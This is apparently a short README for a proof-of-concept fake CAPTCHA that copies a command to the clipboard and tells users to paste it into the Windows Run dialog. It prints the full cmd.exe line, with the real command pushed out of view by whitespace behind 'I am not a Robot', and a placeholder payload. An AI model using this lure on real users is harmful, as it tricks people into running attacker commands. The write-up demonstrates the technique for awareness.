<h3 align=center> fake-captcha-poc </h3>
<p align=center> *for educational purposes only* </p>


### how it works

1. command gets copied after user starts verification
2. user gets told to paste it in windows run dialogue box
3. command runs and verification successful page opens

#### full command

```batch
cmd.exe /c start /min https://fake-captcha-poc.o10.me/verified/ && echo get pwned && pause && rem                                    I am not a Robot                                   
```

#### visible part

```
                                    I am not a Robot                                   
```

#### payload (example)

```
echo get pwned && pause
```


